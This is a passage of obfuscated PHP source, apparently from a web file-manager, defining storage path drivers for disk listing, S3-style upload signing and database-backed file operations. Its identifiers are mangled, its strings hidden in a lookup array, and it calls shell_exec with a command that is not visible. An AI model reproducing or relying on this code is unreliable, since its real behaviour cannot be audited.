$„’ôÂÔ©; } $„’ôÂÔ© = IO::init(self::defaultIO()); return $„’ôÂÔ©; } public static function fileTypeList() { $ìóÀİ¹ =& $_SERVER[ú÷îèÆÜ]; $Â¡¥Ö¿ = $GLOBALS[$ìóÀİ¹[16]][$ìóÀİ¹[1337]]; foreach ($Â¡¥Ö¿ as $À ò† => $ÏÈ­Ü§¦) { $Æ¾ï’ØÇ = $ìóÀİ¹[1338] . $À ò†; $ÁÒ‹Şòˆ = LNG($Æ¾ï’ØÇ); if ($Æ¾ï’ØÇ != $ÁÒ‹Şòˆ) { $Â¡¥Ö¿[$À ò†][$ìóÀİ¹[42]] = $ÁÒ‹Şòˆ; } } return $Â¡¥Ö¿; } public static function diskList($Êºòôì¤ = true) { $ı—ı½Å = $_SERVER[ú÷îèÆÜ][1339]; if ($Êºòôì¤) { $ºÌÀáù¾ = Cache::get($ı—ı½Å); if (is_array($ºÌÀáù¾)) { return $ºÌÀáù¾; } } $ºÌÀáù¾ = self::diskListGet(); Cache::set($ı—ı½Å, $ºÌÀáù¾, 60); return $ºÌÀáù¾; } public static function diskListGet() { $è–…ÅÏ¸ =& $_SERVER[ú÷îèÆÜ]; $öÈ•¡»Ò = array(); if ($GLOBALS[$è–…ÅÏ¸[16]][$è–…ÅÏ¸[1340]] == $è–…ÅÏ¸[1341]) { $ÙÒø‰÷Ã = $è–…ÅÏ¸[1342]; for ($ŞÁË©úÚ = 0; $ŞÁË©úÚ < strlen($ÙÒø‰÷Ã); $ŞÁË©úÚ++) { $…ŸÈ€Ö  = $ÙÒø‰÷Ã[$ŞÁË©úÚ] . $è–…ÅÏ¸[1343]; if (file_exists($…ŸÈ€Ö )) { $öÈ•¡»Ò[] = $…ŸÈ€Ö ; } } return $öÈ•¡»Ò; } if (!function_exists($è–…ÅÏ¸[108])) { $öÈ•¡»Ò[] = $è–…ÅÏ¸[876]; return $öÈ•¡»Ò; } $‘™‰ÆÂÁ = explode($è–…ÅÏ¸[11], shell_exec($è–…ÅÏ¸[1344])); array_shift($‘™‰ÆÂÁ); array_pop($‘™‰ÆÂÁ); $áÒ…½µÔ = array($è–…ÅÏ¸[1345], $è–…ÅÏ¸[1346], $è–…ÅÏ¸[1347], $è–…ÅÏ¸[1348], $è–…ÅÏ¸[1349], $è–…ÅÏ¸[1350], $è–…ÅÏ¸[1351], $è–…ÅÏ¸[1352]); foreach ($‘™‰ÆÂÁ as $¡°ÒßÇ£) { $ÈÍõ‘¸ = preg_split($è–…ÅÏ¸[1353], $¡°ÒßÇ£); $…ŸÈ€Ö  = $ÈÍõ‘¸[count($ÈÍõ‘¸) - 1]; if (!strstr($ÈÍõ‘¸[0], $è–…ÅÏ¸[1354]) || !$…ŸÈ€Ö ) { continue; } $–™šÎ¥‚ = rtrim($…ŸÈ€Ö , $è–…ÅÏ¸[18]) . $è–…ÅÏ¸[18]; if (in_array($–™šÎ¥‚, $áÒ…½µÔ)) { continue; } $öÈ•¡»Ò[] = $–™šÎ¥‚; } return $öÈ•¡»Ò; } public static function isSameDisk($èµ˜ßÉõ, $°©ì¬˜‘) { $‘ìı¾›ı =& $_SERVER[ú÷îèÆÜ]; if ($GLOBALS[$‘ìı¾›ı[16]][$‘ìı¾›ı[1340]] == $‘ìı¾›ı[1341]) { return strtolower(substr($èµ˜ßÉõ, 0, 1)) == strtolower(substr($°©ì¬˜‘, 0, 1)); } $¯Êõõ”¯ = self::diskList(); $ã«€å¿ğ = !1; $§ÙªıÄŸ = !1; sort($¯Êõõ”¯); $¯Êõõ”¯ = array_reverse($¯Êõõ”¯); $èµ˜ßÉõ = rtrim($èµ˜ßÉõ, $‘ìı¾›ı[18]) . $‘ìı¾›ı[18]; $°©ì¬˜‘ = rtrim($°©ì¬˜‘, $‘ìı¾›ı[18]) . $‘ìı¾›ı[18]; foreach ($¯Êõõ”¯ as $åå±Å ù) { $ë¨ñğ• = strlen($åå±Å ù); if (!$ã«€å¿ğ && substr($èµ˜ßÉõ, 0, $ë¨ñğ•) == $åå±Å ù) { $ã«€å¿ğ = $åå±Å ù; } if (!$§ÙªıÄŸ && substr($°©ì¬˜‘, 0, $ë¨ñğ•) == $åå±Å ù) { $§ÙªıÄŸ = $åå±Å ù; } if ($ã«€å¿ğ && $§ÙªıÄŸ) { break; } } return $ã«€å¿ğ === $§ÙªıÄŸ; } public static function transferType($’Àåó™¨, $ó‡Úêçç) { $Ûé‡ ®Ç =& $_SERVER[ú÷îèÆÜ]; $÷ßÙ³ = self::driverType($’Àåó™¨); $Ó±Ô¬øª = self::driverType($ó‡Úêçç); if ($÷ßÙ³[$Ûé‡ ®Ç[43]] == $Ó±Ô¬øª[$Ûé‡ ®Ç[43]] && $÷ßÙ³[$Ûé‡ ®Ç[1355]] == $Ó±Ô¬øª[$Ûé‡ ®Ç[1355]]) { return $Ûé‡ ®Ç[1356]; } if ($÷ßÙ³[$Ûé‡ ®Ç[43]] == $Ûé‡ ®Ç[909] && $Ó±Ô¬øª[$Ûé‡ ®Ç[43]] == $Ûé‡ ®Ç[116]) { return $Ûé‡ ®Ç[1235]; } if ($÷ßÙ³[$Ûé‡ ®Ç[43]] == $Ûé‡ ®Ç[116] && $Ó±Ô¬øª[$Ûé‡ ®Ç[43]] == $Ûé‡ ®Ç[909]) { return $Ûé‡ ®Ç[117]; } return $Ûé‡ ®Ç[1357]; } public static function driverType($õÍÆ—õë) { $©èŒˆÜ =& $_SERVER[ú÷îèÆÜ]; $À”Èô›¡ = str_replace($©èŒˆÜ[1358], $©èŒˆÜ[22], strtolower($õÍÆ—õë->getType())); if ($À”Èô›¡ == $©èŒˆÜ[797] || $À”Èô›¡ == $©èŒˆÜ[1359] || $À”Èô›¡ == $©èŒˆÜ[1360]) { $õÍÆ—õë = self::defaultDriverInit(); } else { if ($À”Èô›¡ == $©èŒˆÜ[1245] || $À”Èô›¡ == $©èŒˆÜ[1361]) { $õÍÆ—õë = IO::init($õÍÆ—õë->pathParse[$©èŒˆÜ[1192]]); } } $„±—Óü© = $õÍÆ—õë->path; $À”Èô›¡ = str_replace($©èŒˆÜ[1358], $©èŒˆÜ[22], strtolower($õÍÆ—õë->getType())); if ($À”Èô›¡ == $©èŒˆÜ[116]) { return array($©èŒˆÜ[43] => $©èŒˆÜ[116], $©èŒˆÜ[1355] => $©èŒˆÜ[22], $©èŒˆÜ[94] => $„±—Óü©, $©èŒˆÜ[105] => $õÍÆ—õë); } return array($©èŒˆÜ[43] => $©èŒˆÜ[909], $©èŒˆÜ[1355] => $õÍÆ—õë->pathDriver, $©èŒˆÜ[94] => $„±—Óü©, $©èŒˆÜ[105] => $õÍÆ—õë); } public static function pathDriverType($Á–¥¶¦ó) { return $Á–¥¶¦ó ? self::driverType(IO::init($Á–¥¶¦ó)) : !1; } public static function pathDriverLocal($¸‘Øßè) { $‘ŒâØ’á =& $_SERVER[ú÷îèÆÜ]; $×ß²‘ˆŒ = $¸‘Øßè ? self::driverType(IO::init($¸‘Øßè)) : !1; return $×ß²‘ˆŒ[$‘ŒâØ’á[43]] == $‘ŒâØ’á[116] ? !0 : !1; } public static function allowCover($–Ò‰¢Ü‹, $œÈÈ€À³ = true) { $üÚ¾•Å¡ =& $_SERVER[ú÷îèÆÜ]; if (is_string($–Ò‰¢Ü‹)) { $–Ò‰¢Ü‹ = IO::info($–Ò‰¢Ü‹); } if (!$–Ò‰¢Ü‹ || $–Ò‰¢Ü‹[$üÚ¾•Å¡[43]] == $üÚ¾•Å¡[85] || $–Ò‰¢Ü‹[$üÚ¾•Å¡[86]] <= 100) { return !1; } if (isset($–Ò‰¢Ü‹[$üÚ¾•Å¡[1362]]) || !$–Ò‰¢Ü‹[$üÚ¾•Å¡[94]]) { return !1; } if (isset($–Ò‰¢Ü‹[$üÚ¾•Å¡[226]]) && !$–Ò‰¢Ü‹[$üÚ¾•Å¡[226]]) { return !1; } static $ïŒ§Ã = false; if (!$ïŒ§Ã || !$œÈÈ€À³) { $á¬ƒâº = self::driverType(IO::init($–Ò‰¢Ü‹[$üÚ¾•Å¡[94]])); $œ¿Çûà× = $á¬ƒâº[$üÚ¾•Å¡[105]]; $ïŒ§Ã = $üÚ¾•Å¡[194]; if ($á¬ƒâº[$üÚ¾•Å¡[43]] == $üÚ¾•Å¡[116]) { $ïŒ§Ã = $üÚ¾•Å¡[1363]; } if ($á¬ƒâº[$üÚ¾•Å¡[105]] && is_array($á¬ƒâº[$üÚ¾•Å¡[105]]->config)) { $ç±¸›¤ã = $á¬ƒâº[$üÚ¾•Å¡[105]]->config; if (isset($ç±¸›¤ã[$üÚ¾•Å¡[1364]]) && $ç±¸›¤ã[$üÚ¾•Å¡[1364]]) { $ïŒ§Ã = $üÚ¾•Å¡[1363]; } } } return $ïŒ§Ã == $üÚ¾•Å¡[1363] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($…¥Îœï) { parent::__construct($…¥Îœï); $this->signatureVersion($_SERVER[ú÷îèÆÜ][241]); } public function uploadFormData($Â×Ú£üº, $Ó¾À“ ã = 3600) { $¸¸™Ï… =& $_SERVER[ú÷îèÆÜ]; $ø¨ÔÊÏø = $¸¸™Ï…[223]; $¥‡Š = $¸¸™Ï…[256]; $ÃùÆ—² = $¸¸™Ï…[266]; $®åê ‹’ = gmdate($¸¸™Ï…[1365], time() + $Ó¾À“ ã); $³³¶úäÙ = (string) time() . $¸¸™Ï…[81] . (string) (time() + $Ó¾À“ ã); $—å›¡º˜ = array($¸¸™Ï…[267] => $®åê ‹’, $¸¸™Ï…[270] => array(array($¸¸™Ï…[272] => $ø¨ÔÊÏø), array($¸¸™Ï…[271] => $this->bucket), array($¸¸™Ï…[273], $¸¸™Ï…[274], $¸¸™Ï…[22]), array($¸¸™Ï…[277] => $ÃùÆ—²), array($¸¸™Ï…[1366] => $¥‡Š), array($¸¸™Ï…[1367] => $this->accessKey), array($¸¸™Ï…[1368] => $³³¶úäÙ))); $—å›¡º˜ = json_encode($—å›¡º˜); $ Í‰ù’• = hash_hmac($¸¸™Ï…[256], $³³¶úäÙ, $this->secret); $—å²ì° = sha1($—å›¡º˜); $²Œ–ì« = hash_hmac($¸¸™Ï…[256], $—å²ì°, $ Í‰ù’•); $ÆÂÕ½×õ = array($¸¸™Ï…[272] => $ø¨ÔÊÏø, $¸¸™Ï…[277] => $ÃùÆ—², $¸¸™Ï…[285] => base64_encode($—å›¡º˜), $¸¸™Ï…[1366] => $¥‡Š, $¸¸™Ï…[1367] => $this->accessKey, $¸¸™Ï…[1369] => $³³¶úäÙ, $¸¸™Ï…[1370] => $²Œ–ì«, $¸¸™Ï…[206] => $this->getHost()); return $ÆÂÕ½×õ; } public function fileOutLink($Õ¨³¥Ì) { $»à‘†¯· =& $_SERVER[ú÷îèÆÜ]; if (substr($Õ¨³¥Ì, 0, 7) == $»à‘†¯·[1371]) { $Õ¨³¥Ì = $»à‘†¯·[1372] . substr($Õ¨³¥Ì, 7); } header($»à‘†¯·[172] . $Õ¨³¥Ì); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($•…•¡) { $this->pathParse = $•…•¡; $this->model = Model($_SERVER[ú÷îèÆÜ][1373]); } public function getPath($¼›”Ù˜ü) { return trim($¼›”Ù˜ü, $_SERVER[ú÷îèÆÜ][18]); } public function pathFather($€¬¬ƒşÇ) { $àÂä’Ê = $this->parse($€¬¬ƒşÇ); $àÂä’Ê = $this->infoSimple($€¬¬ƒşÇ); return $àÂä’Ê ? $àÂä’Ê[$_SERVER[ú÷îèÆÜ][190]] : !1; } public function pathThis($á½Õâ) { $ûÂ¯àÓ = $this->infoSimple($á½Õâ); return $ûÂ¯àÓ ? $ûÂ¯àÓ[$_SERVER[ú÷îèÆÜ][42]] : !1; } public function getPathOuter($ˆÊ÷¹ç) { if (!$ˆÊ÷¹ç) { return $ˆÊ÷¹ç; } $Ó‹Öööì = $this->parse($ˆÊ÷¹ç); return KodIO::make($Ó‹Öööì[$_SERVER[ú÷îèÆÜ][452]]); } public function copyFolderFromIO($˜“ÜÉİò, $¸Ø”øâ¤, $±¡Âç§Ö, $ñÁãÇ˜, $¸åúØèé) { $àñç¼¥ = $this->model->copyFolderFromIO($˜“ÜÉİò, $¸Ø”øâ¤, $±¡Âç§Ö, $ñÁãÇ˜, $¸åúØèé); return KodIO::make($àñç¼¥); } public function isParentOf($«÷ÎœĞ, $ß§ŸÓ®€) { return $this->model->isParentOf($«÷ÎœĞ, $ß§ŸÓ®€); } public function mkfile($¤ƒÖ³éÏ, $õèöğ…Ü = '', $•ÆÏ—¿˜ = REPEAT_RENAME) { $ÍÅ†ş¨û =& $_SERVER[ú÷îèÆÜ]; $Ô‡‹ƒ = $this->parse($¤ƒÖ³éÏ); $¤ƒÖ³éÏ = $Ô‡‹ƒ[$ÍÅ†ş¨û[452]]; for ($Øïƒ¦æ = 0; $Øïƒ¦æ < count($Ô‡‹ƒ[$ÍÅ†ş¨û[1374]]); $Øïƒ¦æ++) { $°ÔßÍÑñ = $Ô‡‹ƒ[$ÍÅ†ş¨û[1374]][$Øïƒ¦æ]; if ($Øïƒ¦æ == count($Ô‡‹ƒ[$ÍÅ†ş¨û[1374]]) - 1) { $¤ƒÖ³éÏ = $this->model->mkfile($¤ƒÖ³éÏ, $°ÔßÍÑñ, $õèöğ…Ü, $•ÆÏ—¿˜); break; } $¤ƒÖ³éÏ = $this->model->mkdir($¤ƒÖ³éÏ, $°ÔßÍÑñ, REPEAT_SKIP); } return $this->getPathOuter($¤ƒÖ³éÏ); } public function mkdir($ë¤™ëæ, $îØÏ¶Ì¥ = REPEAT_SKIP) { $ŞÔÕÒ£Š =& $_SERVER[ú÷îèÆÜ]; $ó–Ğ¬õ = $this->parse($ë¤™ëæ); $ë¤™ëæ = $ó–Ğ¬õ[$ŞÔÕÒ£Š[452]]; for ($İŞÉ·¡— = 0; $İŞÉ·¡— < count($ó–Ğ¬õ[$ŞÔÕÒ£Š[1374]]); $İŞÉ·¡—++) { $Øí£‡ÎŸ = $ó–Ğ¬õ[$ŞÔÕÒ£Š[1374]][$İŞÉ·¡—]; $ë¤™ëæ = $this->model->mkdir($ë¤™ëæ, $Øí£‡ÎŸ, $îØÏ¶Ì¥); } return $this->getPathOuter($ë¤™ëæ); } public function copyFile($‡Ï²À…¯, $¼ê®î°õ, $•öõ…âÄ = REPEAT_REPLACE) { $å¹Şš  =& $_SERVER[ú÷îèÆÜ]; $»·ÕÎ™È = $this->parse($¼ê®î°õ); $·üî¼ª = $this->model->copy($‡Ï²À…¯, $»·ÕÎ™È[$å¹Şš [452]], $•öõ…âÄ, $»·ÕÎ™È[$å¹Şš [94]]); return $·üî¼ª ? $this->getPathOuter($·üî¼ª) : !1; } public function moveFile($—İÀ¡›, $†¤îÛİŒ, $À«‘ğÌö = REPEAT_REPLACE) { $ñşÒ˜š– =& $_SERVER[ú÷îèÆÜ]; $ğÍˆç¶ = $this->parse($†¤îÛİŒ); $äşÓÀÓú = $this->model->move($—İÀ¡›, $ğÍˆç¶[$ñşÒ˜š–[452]], $À«‘ğÌö, $ğÍˆç¶[$ñşÒ˜š–[94]]); return $äşÓÀÓú ? $this->getPathOuter($äşÓÀÓú) : !1; } public function copy($Óƒşø, $¶–åşƒÔ, $Ó¿´°ê = REPEAT_REPLACE, $õÀ¯Şš÷ = false) { $áˆ”Î¥û = $this->parse($¶–åşƒÔ); $–˜Ğ²ú¬ = $this->model->copy($Óƒşø, $áˆ”Î¥û[$_SERVER[ú÷îèÆÜ][452]], $Ó¿´°ê, $õÀ¯Şš÷); return $–˜Ğ²ú¬ ? $this->getPathOuter($–˜Ğ²ú¬) : !1; } public function moveSameAllow() { } public function move($³§ó°Íê, $æÉßÚë, $ä‹ÊŒÅ¤ = REPEAT_REPLACE, $à±‡¤ÄĞ = false) { $î½ÜÜ÷ó = $this->parse($æÉßÚë); $áıÊ«Ô‹ = $this->model->move($³§ó°Íê, $î½ÜÜ÷ó[$_SERVER[ú÷îèÆÜ][452]], $ä‹ÊŒÅ¤, $à±‡¤ÄĞ); return $áıÊ«Ô‹ ? $this->getPathOuter($áıÊ«Ô‹) : !1; } public function remove($´ëµÎ¼, $ààèôø‹ = true) { return $this->model->remove($´ëµÎ¼, $ààèôø‹); } public function rename($„âÇì¥¢, $Œ“øÊã¯) { $ÅŒ €Æ¹ = $this->model->rename($„âÇì¥¢, $Œ“øÊã¯); return $ÅŒ €Æ¹ ? $this->getPathOuter($„âÇì¥¢) : $ÅŒ €Æ¹; } public function size($³ş÷®üÇ) { $ê·œı÷˜ = $this->infoSimple($³ş÷®üÇ); return $ê·œı÷˜ ? $ê·œı÷˜[$_SERVER[ú÷îèÆÜ][86]] : 0; } public function infoSimple($Æô¾ûº¤) { return $this->model->sourceInfo($Æô¾ûº¤); } public function info($ıÊİ²Úñ) { return $this->infoParse($ıÊİ²Úñ); } public function infoAuth($–¹µ¬ûÍ) { return $this->infoParse($–¹µ¬ûÍ, !1, !0); } public function infoWithChildren($¾œ–à§î) { return $this->infoParse($¾œ–à§î, !0); } protected function infoParse($ù¾ãï«Ü, $ĞÑ¢¿ß” = false, $÷ûÑ¶ŞŸ = false) { if (!$ĞÑ¢¿ß”) { return $this->model->pathInfo($ù¾ãï«Ü, $÷ûÑ¶ŞŸ); } return $this->model->pathInfoMore($ù¾ãï«Ü); } public function infoFullSimple($€¤·èŸ·) { $Í”äêƒ =& $_SERVER[ú÷îèÆÜ]; $ë¥«ŸŸÙ = explode($Í”äêƒ[18], $€¤·èŸ·); $œğÚŠß = implode($Í”äêƒ[18], array_splice($ë¥«ŸŸÙ, 1)); return $this->model->pathInfoByPath($ë¥«ŸŸÙ[0], $œğÚŠß); } public function infoFull($îÙ‰ÓŒ) { $œ–Œ‚œû = $this->infoFullSimple($îÙ‰ÓŒ); return is_array($œ–Œ‚œû) ? $this->model->pathInfo($œ–Œ‚œû[$_SERVER[ú÷îèÆÜ][191]]) : !1; } public function hashSimple($¶·œ¸¹™) { $‘Ìê›ú´ =& $_SERVER[ú÷îèÆÜ]; $¸Ú¢¬Ş¬ = $this->infoWithChildren($¶·œ¸¹™); return $¸Ú¢¬Ş¬[$‘Ìê›ú´[525]][$‘Ìê›ú´[649]]; } public function hashMd5($®‡Ï‚ûŞ) { $÷‹–ƒÀ» =& $_SERVER[ú÷îèÆÜ]; $´Û³Á¹ = $this->infoWithChildren($®‡Ï‚ûŞ); return $´Û³Á¹[$÷‹–ƒÀ»[525]][$÷‹–ƒÀ»[650]]; } public function exist($©éï•å) { $•ñ¨ùûŞ =& $_SERVER[ú÷îèÆÜ]; $òÈÓ¥“€ = $this->parse($©éï•å); if (!$òÈÓ¥“€[$•ñ¨ùûŞ[94]]) { return $this->isFile($©éï•å) || $this->isFolder($©éï•å); } $£”†Êå = array($•ñ¨ùûŞ[454] => $òÈÓ¥“€[$•ñ¨ùûŞ[452]], $•ñ¨ùûŞ[42] => $òÈÓ¥“€[$•ñ¨ùûŞ[94]]); $Æûç¨İ = $this->model->where($£”†Êå)->find(); return $Æûç¨İ ? !0 : !1; } public function isFile($Ö“¸ÃøÁ) { $Î ¹±ÀÒ =& $_SERVER[ú÷îèÆÜ]; $áŠÈ²ßÉ = $this->infoSimple($Ö“¸ÃøÁ); return $áŠÈ²ßÉ && $áŠÈ²ßÉ[$Î ¹±ÀÒ[462]] == $Î ¹±ÀÒ[222] ? !0 : !1; } public function isFolder($üŠ½¿¨Í) { $åó¯ÎÕ¯ =& $_SERVER[ú÷îèÆÜ]; $¡Âíã¸ë = $this->infoSimple($üŠ½¿¨Í); return $¡Âíã¸ë && $¡Âíã¸ë[$åó¯ÎÕ¯[462]] == $åó¯ÎÕ¯[98] ? !0 : !1; } public function listPath($ŞËÄïŸä, $åıï°™× = false) { $¢øß¹õ½ =& $_SERVER[ú÷îèÆÜ]; if ($ŞËÄïŸä == $¢øß¹õ½[22]) { return !1; } $‡“ÇÜÊ = array($¢øß¹õ½[454] => $ŞËÄïŸä); if ($åıï°™×) { return $this->model->listSource($‡“ÇÜÊ, -1); } return $this->model->listSource($‡“ÇÜÊ); } public function has($¨êêÚÏ§, $ËÛ—ãÍ¥ = false, $îØõøÖ… = null) { $¥ï±æÆ× =& $_SERVER[ú÷îèÆÜ]; $ûİí¿òÄ = $this->infoWithChildren($¨êêÚÏ§); if ($ËÛ—ãÍ¥) { return array($¥ï±æÆ×[234] => $ûİí¿òÄ[$¥ï±æÆ×[234]], $¥ï±æÆ×[233] => $ûİí¿òÄ[$¥ï±æÆ×[233]]); } return $îØõøÖ… ? $ûİí¿òÄ[$¥ï±æÆ×[234]] : $ûİí¿òÄ[$¥ï±æÆ×[233]]; } public function listAll($œÃ®ö¹å) { $ÉÎ¨ÄèË = IO::info($this->pathParse[$_SERVER[ú÷îèÆÜ][94]]); if (!$ÉÎ¨ÄèË) { return array(); } return $this->model->listAll($œÃ®ö¹å); } public function getContent($ƒŠÍóó ) { return $this->model->getContent($ƒŠÍóó ); } public function setContent($Ú›‰¯¹, $‘Ì’˜ÄÔ = '') { return $this->model->setContent($Ú›‰¯¹, $‘Ì’˜ÄÔ); } public function fileSubstr($€ıßÓÃÒ, $ù½±ß€—, $¶¬ÀÊŸÕ) { return $this->model->fileSubstr($€ıßÓÃÒ, $ù½±ß€—, $¶¬ÀÊŸÕ); } public function download($¶İĞ·€Ş, $­ñÓÔÌÑ = '') { $ŸíË›Á¾ = get_path_father($­ñÓÔÌÑ); $ëˆ›Â½À = get_path_this($­ñÓÔÌÑ); $î»Åá€ë = $this->model->fileInfoGet($¶İĞ·€Ş); $Ã¹›Ê©È = IO::copy($î»Åá€ë[$_SERVER[ú÷îèÆÜ][94]], $ŸíË›Á¾, !1, $ëˆ›Â½À); return $Ã¹›Ê©È; } public function setModifyTime($ÉÏöÌ£”, $úÄÇÑ¯­ = '') { $èÆ¢ò =& $_SERVER[ú÷îèÆÜ]; if (!$ÉÏöÌ£”) { return; } $this->model->where(array($èÆ¢ò[468] => $ÉÏöÌ£”))->save(array($èÆ¢ò[95] => $úÄÇÑ¯­)); } public function upload($Œ§ñÇÚÍ, $¿çò÷è, $ü°ª´¥ = false, $¬õ‹Ù‰¼ = REPEAT_REPLACE) { $µÚœ´ˆ =& $_SERVER[ú÷îèÆÜ]; $‹Ü¯ğ´û = $this->parse($Œ§ñÇÚÍ); $¤×“ëõ­ = $this->model->addFile($‹Ü¯ğ´û[$µÚœ´ˆ[452]], $¿çò÷è, $‹Ü¯ğ´û[$µÚœ´ˆ[94]], $ü°ª´¥, $¬õ‹Ù‰¼); return $this->getPathOuter($¤×“ëõ­); } public function uploadFileByID($Ğ¬½ª—š, $°«ªÎÃÖ, $‰¶×—Œâ) { $ı®Ñãİ± =& $_SERVER[ú÷îèÆÜ]; $øÏ¨ÅÆĞ = $this->parse($Ğ¬½ª—š); $Œ’õ”å = $this->model->addFileByFileID($øÏ¨ÅÆĞ[$ı®Ñãİ±[452]], $°«ªÎÃÖ, $øÏ¨ÅÆĞ[$ı®Ñãİ±[94]], $‰¶×—Œâ); return $this->getPathOuter($Œ’õ”å); } public function addFileByRemote($¦çšïëµ, $€š‡ÂÆ„, $åì«”•õ = array(), $ˆØ‰û“ = '', $©úäÉ´) { $ä€àÔÖó =& $_SERVER[ú÷îèÆÜ]; $â’â öŸ = $this->parse($¦çšïëµ); $ˆØ‰û“ = empty($ˆØ‰û“) ? $â’â öŸ[$ä€àÔÖó[94]] : $ˆØ‰û“; $ñ•æ¨æÁ = $this->model->addFileByRemote($â’â öŸ[$ä€àÔÖó[452]], $€š‡ÂÆ„, $ˆØ‰û“, $åì«”•õ, $©úäÉ´); return $this->getPathOuter($ñ•æ¨æÁ); } public function uploadLink($ŒÓ¼ÜÂ§, $Şª¼±µ = 0) { $äÍÒˆÆª =& $_SERVER[ú÷îèÆÜ]; $•ã‚ßšè = $this->parse($ŒÓ¼ÜÂ§); $õÚ˜‚¯È = _get($GLOBALS[$äÍÒˆÆª[17]], $äÍÒˆÆª[1375]); $ªÍú›ì = _get($GLOBALS[$äÍÒˆÆª[17]], $äÍÒˆÆª[1376]); $ŒÓ¼ÜÂ§ = Model($äÍÒˆÆª[652])->createFileName($•ã‚ßšè[$äÍÒˆÆª[94]], $õÚ˜‚¯È, $ªÍú›ì); return IO::uploadLink($ŒÓ¼ÜÂ§, $Şª¼±µ); } public function fileNameAuto($Ó‹ˆ«¢, $í´°£âÔ, $ßŸ”çÁĞ = REPEAT_REPLACE, $«·ÎºÍä = false) { return $this->model->fileNameAuto($Ó‹ˆ«¢, $í´°£âÔ, $ßŸ”çÁĞ, $«·ÎºÍä); } public function fileNameExist($¸´Ñíì˜, $¿˜’¾ÒĞ) { return $this->model->fileNameExist($¸´Ñíì˜, $¿˜’¾ÒĞ); } protected function _fileOut($±éğ«åú, $ª¶‘¢µÕ = false, $ÙÜ¤î× = false, $š€‰ĞˆŒ = '', $÷ÃˆÀûñ = false) { $´¶Áš±½ =& $_SERVER[ú÷îèÆÜ]; $Ãô–íÛ = $this->model->sourceInfo($±éğ«åú); if ($Ãô–íÛ[$´¶Áš±½[462]] == $´¶Áš±½[98]) { header($´¶Áš±½[1377]); die; } $ë°™¢º÷ = $this->model->fileInfoGet($±éğ«åú); $š€‰ĞˆŒ = $ë°™¢º÷[$´¶Áš±½[650]] ? $ë°™¢º÷[$´¶Áš±½[650]] : $š€‰ĞˆŒ; $ûŠöŒä‡ = is_array($GLOBALS[$´¶Áš±½[179]]) ? $GLOBALS[$´¶Áš±½[179]][$´¶Áš±½[42]] : $Ãô–íÛ[$´¶Áš±½[42]]; if ($÷ÃˆÀûñ) { return IO::fileOutServer($ë°™¢º÷[$´¶Áš±½[94]], $ª¶‘¢µÕ, $ûŠöŒä‡, $š€‰ĞˆŒ); } IO::fileOut($ë°™¢º÷[$´¶Áš±½[94]], $ª¶‘¢µÕ, $ûŠöŒä‡, $š€‰ĞˆŒ); } public function fileOut($íäŒ¨ó°, $ÖÆ„¾¸ = false, $§§—™Úà = false, $ÈÉíş™Ö = '') { $this->_fileOut($íäŒ¨ó°, $ÖÆ„¾¸, $§§—™Úà, $ÈÉíş™Ö); } public function fileOutServer($êƒ­€ÏŞ, $æïÓû¯Œ = false, $á®òê´„ = false, $ÂŒ¾ìµ = '') { $this->_fileOut($êƒ­€ÏŞ, $æïÓû¯Œ, $á®òê´„, $ÂŒ¾ìµ, !0); } protected function _fileOutImage($òÄº‰Û—, $€Üåá¾« = 250) { $œêÎÄò =& $_SERVER[ú÷îèÆÜ]; $î¹¹Ìªê = $this->model->pathInfo($òÄº‰Û—); if ($î¹¹Ìªê[$œêÎÄò[462]] == $œêÎÄò[98]) { show_json($œêÎÄò[1378] . $òÄº‰Û—, !1); } $ÔıŞğ“ñ = $this->model->fileInfoGet($òÄº‰Û—); $î¹¹Ìªê[$œêÎÄò[180]] = $ÔıŞğ“ñ[$œêÎÄò[94]]; $GLOBALS[$œêÎÄò[179]] = $î¹¹Ìªê; IO::fileOutImage($ÔıŞğ“ñ[$œêÎÄò[94]], $€Üåá¾«); } public function fileOutImage($ıŠãÍî¹, $úÑäÍ•ï = 250) { $this->_fileOutImage($ıŠãÍî¹, $úÑäÍ•ï); } public function fileOutImageServer($É†¨ĞÅ’, $ùšÊ©´¼ = 250) { $this->_fileOutImage($É†¨ĞÅ’, $ùšÊ©´¼); } public function link($Øé¤É, $»Š”ÛÄÄ = '') { $èÒÆ·î = $this->model->fileInfoGet($Øé¤É); return IO::link($èÒÆ·î[$_SERVER[ú÷îèÆÜ][94]], $»Š”ÛÄÄ); } protected function parse($´‘úƒ) { $×¤‡éÉ =& $_SERVER[ú÷îèÆÜ]; if (strstr($´‘úƒ, $×¤‡éÉ[18]) === !1) { return array($×¤‡éÉ[470] => intval($´‘úƒ), $×¤‡éÉ[94] => $×¤‡éÉ[22], $×¤‡éÉ[1374] => array()); } $Ú‰¥Û»ë = explode($×¤‡éÉ[18], trim($´‘úƒ, $×¤‡éÉ[18])); if (count($Ú‰¥Û»ë) < 2) { show_tips(clear_html($´‘úƒ) . $×¤‡éÉ[1379]); } return array($×¤‡éÉ[470] => intval($Ú‰¥Û»ë[0]), $×¤‡éÉ[94] => $Ú‰¥Û»ë[1], $×¤‡éÉ[1374] => array_slice($Ú‰¥Û»ë, 1)); } } goto døŠÌáâ½; Fê‡ÎÄ¤¾İ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($©ÆÔœ¾ı) { $this->pathParse = $©ÆÔœ¾ı; } protected function infoParse($ÓÆ¦¶–œ, $Ê»¼ÛñÉ = false) { $³íúÅãƒ =& $_SERVER[ú÷îèÆÜ]; return Action($³íúÅãƒ[1215])->sharePathInfo($this->pathParse[$³íúÅãƒ[94]], !0, $Ê»¼ÛñÉ); } public function listPath($ŞŞÌã, $÷ˆõúÈã = false) { $æ ‹‚§€ =& $_SERVER[ú÷îèÆÜ]; $¼òƒñ”™ = IO::listPath($ŞŞÌã, $÷ˆõúÈã); if (!$¼òƒñ”™) { return $¼òƒñ”™; } if (is_array($¼òƒñ”™[$æ ‹‚§€[1381]])) { $ÚĞ¶‚ŞÆ = Action($æ ‹‚§€[1390])->parsePathChildren($¼òƒñ”™[$æ ‹‚§€[1381]], array($æ ‹‚§€[472] => $ŞŞÌã)); $¼òƒñ”™[$æ ‹‚§€[1381]] = Action($æ ‹‚§€[1215])->shareItemInfo($ÚĞ¶‚ŞÆ); } foreach ($¼òƒñ”™ as $×èãï => $çñ‡é‰½) { if (!in_array($×èãï, array($æ ‹‚§€[93], $æ ‹‚§€[92]))) { continue; } foreach ($çñ‡é‰½ as $´ƒŠ¹…˜ => $ÚĞ¶‚ŞÆ) { $ÚĞ¶‚ŞÆ = Action($æ 